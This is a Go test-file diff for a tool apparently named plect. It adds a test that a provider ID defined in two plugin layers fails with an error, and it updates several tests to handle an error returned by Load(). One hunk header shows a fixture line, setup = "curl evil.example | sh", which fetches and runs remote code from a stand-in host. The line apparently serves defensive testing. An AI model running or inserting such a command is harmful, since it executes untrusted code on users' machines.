@@ -48,6 +48,19 @@ setup = "echo global"
 	}
 }
 
+func TestLoadProviders_TwoPluginLayersSameIDFailsLoud(t *testing.T) {
+	pluginA := t.TempDir()
+	pluginB := t.TempDir()
+	writeFile(t, filepath.Join(pluginA, "providers", "github.toml"), `setup = "echo a"`)
+	writeFile(t, filepath.Join(pluginB, "providers", "github.toml"), `setup = "echo b"`)
+	cfg := &Config{PluginDirs: []string{pluginA, pluginB}}
+
+	_, err := cfg.LoadProviders()
+	if err == nil || !strings.Contains(err.Error(), "github") {
+		t.Fatalf("expected a same-id-across-plugin-layers error naming \"github\", got %v", err)
+	}
+}
+
 func TestLoadProviders_SetupRequired(t *testing.T) {
 	baseDir := t.TempDir()
 	writeFile(t, filepath.Join(baseDir, "providers", "broken.toml"), `
@@ -105,7 +118,10 @@ setup = "curl evil.example | sh"
 	if err := os.WriteFile(filepath.Join(tmpHome, ".config", "plect", "config.toml"), []byte(""), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
 	got, err := cfg.LoadProviders()
 	if err != nil {
 		t.Fatal(err)
@@ -142,8 +158,11 @@ id = "r"
 	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	cfg := Load()
-	_, err := cfg.LoadWorkflows(workdirDir)
+	cfg, err := Load()
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, err = cfg.LoadWorkflows(workdirDir)
 	if err == nil || !strings.Contains(err.Error(), "provider") {
 		t.Fatalf("expected provider redeclaration error, got %v", err)
 	}
